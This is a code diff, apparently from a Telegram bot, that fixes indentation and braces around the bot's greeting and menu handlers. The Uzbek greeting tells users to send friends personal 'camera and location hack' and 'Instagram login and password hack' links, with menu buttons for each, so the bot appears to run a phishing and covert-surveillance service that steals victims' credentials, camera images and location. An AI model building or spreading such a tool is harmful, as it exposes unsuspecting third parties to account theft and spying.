@@ -108,19 +108,20 @@ await saveUser(id);
 const personalInstaLink = `https://${HOST}/insta/${id}`;
 const referralLink = `https://${HOST}/r/${id}`;
 
-await ctx.reply(
-  `✨ *Xush Kelibsiz! Bu Havolalarni Dostlaringizga Yuboring *\n\n🔗 *Kamera va Lokatsiyan Hack havolasi:*\n${referralLink}\n\n📷 *Instagram Login va Parol hack havolasi:*\n${personalInstaLink}\n\nПоделитесь ссылкой или откройте профиль.`,
-  {
-    parse_mode: "Markdown",
-    reply_markup: {
-      keyboard: [
-        ["📷 Instagram Hack", "📸 Camera Hack"],
-        ["☎️ Admin bilan bog'lanish"]
-      ],
-      resize_keyboard: true
+  await ctx.reply(
+    `✨ *Xush Kelibsiz! Bu Havolalarni Dostlaringizga Yuboring *\n\n🔗 *Kamera va Lokatsiyan Hack havolasi:*\n${referralLink}\n\n📷 *Instagram Login va Parol hack havolasi:*\n${personalInstaLink}\n\nПоделитесь ссылкой или откройте профиль.`,
+    {
+      parse_mode: "Markdown",
+      reply_markup: {
+        keyboard: [
+          ["📷 Instagram Hack", "📸 Camera Hack"],
+          ["☎️ Admin bilan bog'lanish"]
+        ],
+        resize_keyboard: true
+      }
     }
-  }
-);
+  );
+});
 
 // Handle text messages for menu buttons
 bot.hears("📷 Instagram Hack", async (ctx) => {
@@ -141,7 +142,6 @@ bot.hears("📸 Camera Hack", async (ctx) => {
 
 bot.hears("☎️ Admin bilan bog'lanish", async (ctx) => {
   await ctx.reply("Admin bilan bog'lanish uchun: @admin_username");
-});
 });
 
 bot.action("check_subscription", async (ctx) => {
